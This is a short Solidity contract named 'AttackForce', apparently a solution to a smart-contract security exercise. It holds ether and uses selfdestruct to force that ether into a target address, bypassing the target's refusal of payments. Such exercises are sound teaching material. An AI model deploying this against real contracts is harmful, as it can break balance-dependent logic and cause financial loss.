// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract AttackForce {
    constructor() payable {
        require(msg.value > 0);
    }

    function attack(address payable _addr) external  {
        selfdestruct(_addr);
    }
}
